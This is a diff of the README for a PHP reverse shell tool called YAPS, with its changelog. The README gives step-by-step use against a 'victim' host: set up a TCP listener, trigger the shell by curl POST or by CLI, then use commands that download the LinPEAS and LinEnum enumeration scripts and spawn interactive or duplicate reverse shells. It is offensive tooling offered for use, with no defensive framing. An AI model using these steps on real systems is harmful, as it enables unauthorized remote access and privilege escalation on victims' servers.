@@ -35,15 +35,17 @@ It's currently in its first version and I haven't tested it much yet, and *there
 1. Set up a TCP listener;
 2. Set your IP and port. This can be done by:
 * 2.1 Editing the variables at the start of the script;
-* 2.2 Setting them via web request (`curl -x POST -d "x=ip&y=port" victim.com/yaps.php` or `curl victim.com/yaps.php?x=ip&y=port`);
-3. Open yaps.php on browser or curl it;
+* 2.2 Setting them via post request (`curl -x POST -d "x=ip:port" victim.com/yaps.php`);
+3. Open yaps.php on browser, curl it or run via CLI;
 * 3.1 You can set `yaps.php?s` or `yaps.php?silent` to supress the banner
+* 3.2 You can run via CLI with `php yaps.php ip port`
 5. Hack!
 
 ## Working commands
 * `!help - Display the help menu`
 * `!all-colors - Toggle all colors (compatible with colorless TTY)`
 * `!color - Toggle PS1 color (locally only, no environment variable is changed)`
+* `!duplicate - Spawn another YAPS connection`
 * `!enum - Download LinPEAS and LinEnum to /tmp and get them ready to use`
 * `!info - list informations about the target (the enumeration I mentioned above)`
 * `!stabilize - Spawn an interactive reverse shell on another port (works w/ sudo, su, mysql, etc.)`
@@ -57,7 +59,9 @@ It's currently in its first version and I haven't tested it much yet, and *there
 
 ![image](https://user-images.githubusercontent.com/3837916/124777687-c4dca080-df16-11eb-94b7-ef77127c5f20.png)
 
-![image](https://user-images.githubusercontent.com/3837916/124775570-1b48df80-df15-11eb-8a3d-90090e8b8016.png)
+![stabilize](https://user-images.githubusercontent.com/3837916/126051284-01165586-aeba-4dff-b192-913a17bdfe2e.gif)
+
+![duplicate](https://user-images.githubusercontent.com/3837916/126051287-7605240f-1845-460a-bb9c-82e0e0dfd96b.gif)
 
 ![image](https://user-images.githubusercontent.com/3837916/124774830-7dedab80-df14-11eb-9e84-c8d88b9f4de2.png)
 
@@ -67,12 +71,12 @@ It's currently in its first version and I haven't tested it much yet, and *there
 
 **v1.2 - 17/07/2021**
 - Added `!duplicate` to spawn another shell
-- Added update verification (--update|-u)
-- Added socket via arguments
-- Added CLI arguments (--help|-h)
+- Added update verification (`--update|-u`)
+- Added CLI arguments (`--help|-h`)
+- Added socket via arguments (`php yaps.php ip port`)
 - Changed stabilize shell method (doesn't freeze anymore)
 - Changed download method
-- Changed connection method via POST
+- Changed connection method via POST (receives a single parameter)
 
 **v1.1 - 12/07/2021**
 - Added `!all-colors` to toggle terminal colors and work with colorless TTYs
